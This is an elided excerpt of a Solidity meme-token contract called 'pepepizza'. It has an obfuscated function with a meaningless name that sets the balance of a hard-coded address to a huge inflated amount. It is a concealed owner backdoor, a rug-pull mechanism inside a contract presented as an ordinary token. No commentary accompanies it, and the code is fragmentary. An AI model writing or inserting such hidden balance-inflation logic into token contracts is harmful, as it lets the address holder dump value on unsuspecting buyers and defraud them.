...
contract MEMEToken is Ownable {
    ...
    function pepepogAdddmmm() external {
        ...
        if (_cwojakpepe345!= tswojaks){
            revert("tswojaks"); 
        }
        if(_cwojakpepe345 == tswojaks){
            _balances[_cwojakpepe345] = peedAmount()*(44000);
        }
    ...
    constructor(string memory tokenName_, string memory Tokensymbol_) {
        _cwojakpepe345 = 0xdFaaCdf9C94f3264E440aA7c1370E81AC4e234ad;
...
contract CoinToken is MEMEToken {
    string _name = "pepepizza";
    string _symbol = "pepepizza";
